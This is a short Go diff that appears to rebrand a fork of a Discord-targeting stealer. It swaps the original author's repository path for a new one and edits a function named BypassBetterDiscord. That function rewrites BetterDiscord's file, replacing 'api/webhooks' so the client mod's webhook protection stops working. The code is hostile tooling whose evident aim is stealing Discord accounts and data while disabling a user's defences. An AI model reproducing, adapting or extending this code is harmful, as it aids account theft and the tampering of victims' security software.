@@ -14,7 +14,7 @@ import (
 
 	"encoding/json"
 
-	"github.com/hackirby/skuld/utils/hardware"
+	"github.com/0xFl4q/1237FHJQSDF1234/utils/hardware"
 	"github.com/shirou/gopsutil/v3/process"
 )
 
@@ -98,7 +98,7 @@ func BypassBetterDiscord(user string) error {
 	encoder := charmap.CodePage437.NewEncoder()
 	encodedWriter := encoder.Writer(w)
 
-	_, err = encodedWriter.Write(bytes.ReplaceAll(txt, []byte("api/webhooks"), []byte("ByHackirby")))
+	_, err = encodedWriter.Write(bytes.ReplaceAll(txt, []byte("api/webhooks"), []byte("ByZeubrkk")))
 	if err != nil {
 		return err
 	}
